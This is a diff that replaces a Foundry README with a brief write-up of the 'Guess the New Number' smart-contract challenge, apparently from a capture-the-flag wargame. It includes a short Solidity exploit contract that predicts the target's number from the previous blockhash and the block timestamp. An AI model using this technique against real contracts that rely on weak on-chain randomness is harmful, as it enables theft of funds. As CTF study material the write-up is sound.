@@ -1,66 +1,17 @@
-## Foundry
+# Guess the New Number
 
-**Foundry is a blazing fast, portable and modular toolkit for Ethereum application development written in Rust.**
+Answer is already there. We can see how number has been generated and it is generated on each function call, dependeing on previous bock and current block timestamp, 
+so we cak use the same to calculate it.
 
-Foundry consists of:
-
--   **Forge**: Ethereum testing framework (like Truffle, Hardhat and DappTools).
--   **Cast**: Swiss army knife for interacting with EVM smart contracts, sending transactions and getting chain data.
--   **Anvil**: Local Ethereum node, akin to Ganache, Hardhat Network.
--   **Chisel**: Fast, utilitarian, and verbose solidity REPL.
-
-## Documentation
-
-https://book.getfoundry.sh/
-
-## Usage
-
-### Build
-
-```shell
-$ forge build
 ```
+contract ExploitContract {
+    GuessNewNumber public guessNewNumber;
+    uint8 public answer;
 
-### Test
+    function Exploit() public returns (uint8) {
+        answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
 
-```shell
-$ forge test
-```
-
-### Format
-
-```shell
-$ forge fmt
-```
-
-### Gas Snapshots
-
-```shell
-$ forge snapshot
-```
-
-### Anvil
-
-```shell
-$ anvil
-```
-
-### Deploy
-
-```shell
-$ forge script script/Counter.s.sol:CounterScript --rpc-url <your_rpc_url> --private-key <your_private_key>
-```
-
-### Cast
-
-```shell
-$ cast <subcommand>
-```
-
-### Help
-
-```shell
-$ forge --help
-$ anvil --help
-$ cast --help
+        return answer;
+    }
+}
 ```
